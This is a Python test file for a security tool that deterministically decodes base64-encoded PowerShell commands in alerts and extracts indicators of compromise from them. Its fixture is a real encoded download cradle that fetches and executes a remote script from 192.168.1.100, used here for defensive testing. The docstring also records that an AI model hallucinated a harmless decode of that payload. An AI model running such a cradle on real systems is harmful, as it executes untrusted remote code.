"""Deterministic command-line deobfuscation for the log-analysis path.

The Foundation-Sec live test showed the model *hallucinates* base64 decodes
(it invented a benign `Get-Process OneNote` command for a real IEX download
cradle). Decoding must be deterministic (Python), and the model must reason
over the decoded fact — never decode it itself.
"""
from ion.services.command_deobfuscate import (
    decode_powershell_encoded,
    decoded_ioc_text,
    deobfuscate_alert,
)
from ion.services.ioc_text_extractor import extract_iocs

# Real `powershell -enc` payload (UTF-16LE base64) — an IEX download cradle.
IEX_CRADLE_B64 = (
    "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4A"
    "RABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgA"
    "LgAxAC4AMQAwADAALwBhAC4AcABzADEAJwApAA=="
)


def test_decodes_utf16le_iex_cradle():
    cmd = f"powershell.exe -nop -w hidden -enc {IEX_CRADLE_B64}"
    decoded = decode_powershell_encoded(cmd)
    assert len(decoded) == 1
    d = decoded[0]
    assert "IEX" in d or "New-Object" in d
    assert "DownloadString" in d
    assert "http://192.168.1.100/a.ps1" in d


def test_full_encodedcommand_flag_and_case_insensitive():
    cmd = f"powershell -EncodedCommand {IEX_CRADLE_B64}"
    assert decode_powershell_encoded(cmd)
    assert decode_powershell_encoded(cmd.upper().replace(IEX_CRADLE_B64.upper(), IEX_CRADLE_B64))


def test_plain_command_yields_nothing():
    assert decode_powershell_encoded("powershell.exe -File C:\\ops\\backup.ps1") == []


def test_executionpolicy_flag_not_treated_as_encoded():
    # -ExecutionPolicy is not -EncodedCommand; its value isn't a base64 blob.
    assert decode_powershell_encoded("powershell -ExecutionPolicy Bypass -File x.ps1") == []


def test_bad_base64_does_not_crash():
    assert decode_powershell_encoded("powershell -enc not-valid-base64!!") == []
    assert decode_powershell_encoded("") == []
    assert decode_powershell_encoded(None) == []


def test_deobfuscate_alert_scans_command_line_fields():
    alert = {
        "rule_name": "Suspicious PowerShell EncodedCommand",
        "process.command_line": f"powershell.exe -w hidden -enc {IEX_CRADLE_B64}",
        "user": "CORP\\jbloggs",
    }
    results = deobfuscate_alert(alert)
    assert len(results) == 1
    assert results[0]["field"] == "process.command_line"
    assert "DownloadString" in results[0]["decoded"]


def test_deobfuscate_alert_clean_when_no_encoding():
    alert = {"process.command_line": "cmd.exe /c whoami", "user": "svc"}
    assert deobfuscate_alert(alert) == []


# ── IOC-extraction seam: the decoded payload's IOCs must be extractable ───────
# (Live test bug: the C2 URL/IP inside the base64 never reached the IOC
# extractor, so `extracted_iocs` was empty for a real download cradle.)

def test_decoded_ioc_text_surfaces_payload():
    text = f"powershell.exe -w hidden -enc {IEX_CRADLE_B64}"
    out = decoded_ioc_text(text)
    assert "192.168.1.100" in out
    assert "a.ps1" in out


def test_decoded_ioc_text_empty_for_clean_command():
    assert decoded_ioc_text("cmd.exe /c whoami") == ""
    assert decoded_ioc_text("") == ""


def test_decoded_payload_iocs_are_extractable():
    text = f"powershell.exe -enc {IEX_CRADLE_B64}"
    iocs = extract_iocs(decoded_ioc_text(text))
    flat = str(iocs)
    assert "192.168.1.100" in flat  # the C2 IP/URL becomes an observable

